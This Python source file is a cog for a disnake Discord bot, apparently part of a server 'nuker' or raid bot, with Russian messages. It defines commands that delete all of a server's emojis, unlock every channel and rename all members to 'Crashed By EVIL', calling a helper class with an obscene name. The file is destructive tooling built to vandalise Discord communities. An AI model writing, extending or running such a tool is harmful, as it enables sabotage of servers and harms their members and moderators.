import disnake
from disnake.ext import commands
from ..utils.bot_operations import Fucker
from ..utils.blacklist import is_blacklisted


class FreeCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="deleteemojis")
    async def deleteemojis(self, ctx):
        """Удалить все эмодзи на сервере"""
        if is_blacklisted(ctx.guild.id):
            embed = disnake.Embed(
                title="⛔ Доступ запрещён",
                description="Этот сервер в чёрном списке.",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return

        embed_start = disnake.Embed(
            title="🗑️ УДАЛЕНИЕ ЭМОДЗИ",
            description="Начинаю удаление всех эмодзи...",
            color=disnake.Color.from_rgb(48, 49, 54)
        )
        await ctx.send(embed=embed_start)

        fucker = Fucker(ctx)
        await fucker.delete_emojis(ctx)

        embed_end = disnake.Embed(
            title="✅ ЭМОДЗИ УДАЛЕНЫ",
            description="Все эмодзи на сервере удалены!",
            color=disnake.Color.green()
        )
        await ctx.send(embed=embed_end)

    @commands.command(name="unlockchannels")
    async def unlockchannels(self, ctx):
        """Разблокировать все каналы"""
        if is_blacklisted(ctx.guild.id):
            embed = disnake.Embed(
                title="⛔ Доступ запрещён",
                description="Этот сервер в чёрном списке.",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return

        embed_start = disnake.Embed(
            title="🔓 РАЗБЛОКИРОВКА КАНАЛОВ",
            description="Начинаю разблокировку всех каналов...",
            color=disnake.Color.from_rgb(48, 49, 54)
        )
        await ctx.send(embed=embed_start)

        fucker = Fucker(ctx)
        await fucker.unlock_channels(ctx)

        embed_end = disnake.Embed(
            title="✅ КАНАЛЫ РАЗБЛОКИРОВАНЫ",
            description="Все каналы разблокированы!",
            color=disnake.Color.green()
        )
        await ctx.send(embed=embed_end)

    @commands.command(name="renameall")
    async def renameall(self, ctx):
        """Переименовать всех участников в 'Crashed By EVIL'"""
        if is_blacklisted(ctx.guild.id):
            embed = disnake.Embed(
                title="⛔ Доступ запрещён",
                description="Этот сервер в чёрном списке.",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return

        embed_start = disnake.Embed(
            title="✏️ ПЕРЕИМЕНОВАНИЕ ВСЕХ",
            description="Начинаю переименование всех участников...",
            color=disnake.Color.from_rgb(48, 49, 54)
        )
        await ctx.send(embed=embed_start)

        fucker = Fucker(ctx)
        await fucker.rename_all(ctx, "Crashed By EVIL")

        embed_end = disnake.Embed(
            title="✅ ПЕРЕИМЕНОВАНИЕ ЗАВЕРШЕНО",
            description="Все участники переименованы в `Crashed By EVIL`!",
            color=disnake.Color.green()
        )
        await ctx.send(embed=embed_end)


def setup(bot):
    bot.add_cog(FreeCommands(bot))